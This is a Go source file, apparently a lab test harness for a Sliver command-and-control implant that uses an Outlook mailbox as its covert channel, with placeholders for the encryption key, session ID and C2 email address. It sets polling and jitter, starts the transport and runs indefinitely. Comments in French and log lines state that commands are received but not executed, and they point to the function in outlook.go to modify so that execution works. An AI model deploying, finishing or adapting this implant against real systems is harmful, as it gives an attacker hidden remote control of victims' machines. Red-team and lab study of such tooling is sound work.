package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// ===== CONFIGURATION - À ADAPTER =====

	// IMPORTANT: Même clé que le serveur !
	encKeyHex := "VOTRE_CLE_ICI" // À remplacer
	encKey, err := outlook.HexToKey(encKeyHex)
	if err != nil {
		log.Fatalf("Invalid encryption key: %v", err)
	}

	// Session ID
	sessionID := "VOTRE_SESSION_ID_ICI" // À remplacer

	// Email du C2 (même que le serveur)
	c2Email := "votre-email@votredomaine.com" // À remplacer

	// Configuration
	config := &outlook.OutlookConfig{
		Enabled:       true,
		C2Email:       c2Email,
		PollInterval:  15 * time.Second, // 15s pour le lab
		FolderType:    outlook.OlFolderInbox,
		EncryptionKey: encKey,
		SessionID:     sessionID,
		DeleteAfter:   false,
		Jitter:        20,
		MaxRetries:    5,
		Debug:         true,
	}

	log.Println("==============================================")
	log.Println("   OUTLOOK IMPLANT - LAB TEST")
	log.Println("==============================================")
	log.Printf("C2 Email: %s", config.C2Email)
	log.Printf("Session ID: %s", sessionID)
	log.Printf("Poll Interval: %v", config.PollInterval)
	log.Printf("OS: %s", runtime.GOOS)
	log.Println("==============================================")

	if err := config.Validate(); err != nil {
		log.Fatalf("Invalid config: %v", err)
	}

	// Note: Pour que ça fonctionne vraiment, il faut modifier outlook.go
	// pour exposer un callback ou permettre l'injection de la fonction executeCommand
	// Pour le lab, on va créer un wrapper custom

	log.Println("[!] IMPORTANT: This is a LAB test implant")
	log.Println("[!] Real command execution requires outlook.go modification")
	log.Println()

	// Créer le transport avec un wrapper custom
	transport := createLabTransport(config)
	defer transport.Close()

	ctx := context.Background()
	if err := transport.Start(ctx); err != nil {
		log.Fatalf("Failed to start transport: %v", err)
	}

	log.Println("[+] Transport STARTED")
	log.Println("[+] Implant is running...")

	// Rester en vie
	select {}
}

// createLabTransport crée un transport avec exécution de commandes custom
func createLabTransport(config *outlook.OutlookConfig) *outlook.OutlookTransport {
	transport, err := outlook.NewOutlookTransport(config)
	if err != nil {
		log.Fatalf("Failed to create transport: %v", err)
	}

	// TODO: Le transport actuel ne permet pas d'override executeCommand
	// Il faut soit:
	// 1. Modifier outlook.go pour accepter un ExecuteFunc
	// 2. Ou utiliser le transport tel quel (il retournera juste "Command received")

	log.Println("[!] NOTE: Commands will be received but not executed")
	log.Println("[!] To enable execution, modify outlook.go:executeCommand()")

	return transport
}
